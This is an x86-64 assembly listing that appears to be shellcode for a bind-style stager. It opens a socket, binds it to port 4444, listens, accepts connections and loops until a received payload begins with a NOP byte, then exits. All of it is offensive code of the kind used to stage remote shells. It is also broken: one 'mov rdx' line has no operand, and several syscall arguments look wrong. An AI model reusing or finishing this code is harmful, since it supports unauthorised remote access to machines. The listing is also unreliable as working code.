global _start

section .text 

_start:
  ; SYS_SOCKET
  push 41
  pop rax       ; RAX = 41
  push 2
  pop rdi       ; RDI = 2
  push 1
  pop rsi       ; RSI = 1
  xor rdx, rdx  ; RDX = 0
  syscall
  push rax 

  ; SYS_SETSOCKOPT
  push 54
  pop rax
  mov rdi, [rsp]
  push 1
  pop rsi
  push 4
  pop rdx
  syscall
 
  ; SYS_BIND
  push 1
  pop rdi
  push 2
  mov word [rsp + 2], 0x5C11
  push rsp
  pop rsi
  push 16
  pop rdx
  push 49
  pop rax
  syscall

  ; SYS_LISTEN
  push rax
  pop rsi
  push 50
  pop rax
  syscall

_awaitshell:
  ; SYS_ACCEPT
  push 43
  pop rax
  syscall

  push rdi
  push rsi
  ; SYS_RECVFROM
  push 16
  pop r9
  push rsp
  pop r8
  xor r10, r10
  lea rsi, [rsp + r9 + 16] ; Buffer after Sockaddr
  mov rdx,        ; Size
  mov rdi, rax
  push 45
  pop rax    
  syscall 
  ;
  pop rsi
  pop rdi

  ; Check if Code begins with NOP
  mov al, byte [rsp + r9]
  cmp al, 0x90
  jne _awaitshell

  ; Exit
  xor rdi, rdi
  push 60
  pop rax
  syscall 
 
